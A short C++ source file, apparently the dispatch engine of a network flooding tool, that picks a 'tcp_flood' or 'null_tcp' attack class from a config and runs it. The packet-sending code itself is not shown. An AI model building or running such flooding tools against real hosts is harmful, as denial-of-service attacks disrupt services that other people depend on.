#include "engine.h"
#include "tcp_flood.h"
#include "null_tcp.h"

#include <memory>

engine::engine(std::shared_ptr<Config> config) {
    std::unique_ptr<Vector> flood{};
    switch(config->vec){
        case TCP_FLOOD:
            flood.reset(new tcp_flood(config));
            flood->run();
            break;
        case NULL_TCP:
            flood.reset(new null_tcp(config));
            flood->run();
            break;
        default:break;
    }
}
